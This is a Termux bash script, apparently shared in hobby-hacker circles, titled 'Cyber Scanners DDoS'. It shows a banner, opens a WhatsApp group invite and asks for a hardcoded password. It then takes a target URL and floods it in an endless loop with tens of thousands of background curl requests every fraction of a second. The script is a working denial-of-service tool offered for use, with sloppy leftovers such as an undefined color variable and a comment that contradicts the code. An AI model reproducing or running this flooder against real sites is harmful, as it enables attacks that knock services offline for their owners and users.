#!/data/data/com.termux/files/usr/bin/bash

clear

#color

y="\e[1;33m"
r="\e[1;31m"
b="\e[1;34m"
pink='\033[1;35m'
GREEN='\033[1;32m'

# Banner
echo -e "${r}"
echo "  ██████╗██╗   ██╗██████╗ ███████╗██████╗ "
echo " ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗"
echo " ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝"
echo " ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗"
echo " ╚██████╗   ██║   ██████╔╝███████╗██║  ██║"
echo "  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝"

echo -e "${r}"
echo " ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ ███████╗"
echo " ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗██╔════╝"
echo " ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝███████╗"
echo " ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗╚════██║"
echo " ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║███████║"
echo " ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚══════╝"

echo " ██████╗ ██████╗  ██████╗ ███████╗"
echo " ██╔══██╗██╔══██╗██╔═══██╗██╔════╝"
echo " ██║  ██║██║  ██║██║   ██║███████╗"
echo " ██║  ██║██║  ██║██║   ██║╚════██║"
echo " ██████╔╝██████╔╝╚██████╔╝███████║"
echo " ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝"

echo -e "${GREEN}                                > DEVALOPER CYBER BLACK LION! <<${NC}"

termux-open-url https://chat.whatsapp.com/HlH3EfeFlar5Fy1YCieMKJ

#!/bin/bash

# Set password
PASSWORD="cyber2002"

# Ask for password
echo -n "Enter password: "
read -s user_input
echo ""

# Check password
if [ "$user_input" == "$PASSWORD" ]; then
    echo "Access granted."
    
    # Place your tool code here
    echo "Running your Termux tool..."
    
    # Example: echo "Hello from your tool!"
    
else
    echo "Access denied. Incorrect password."
    exit 1
fi

# Ask user for the target URL
read -p "Enter the target URL (e.g., http://localhost:8080): " target

# Check if the target is empty
if [ -z "$target" ]; then
    echo "Error: No target URL provided!"
    exit 1
fi

# Ask for number of threads (requests per loop)
read -p "Enter number of threads (default is 50000): " threads
threads=${threads:-50000}  # Use 50 if not specified

# Start the attack loop
echo "Starting attack on $target... Press Ctrl+C to stop."

while true; do
    for i in $(seq 1 $threads); do
        curl -s "$target" > /dev/null &
    done
    sleep 0.2
done
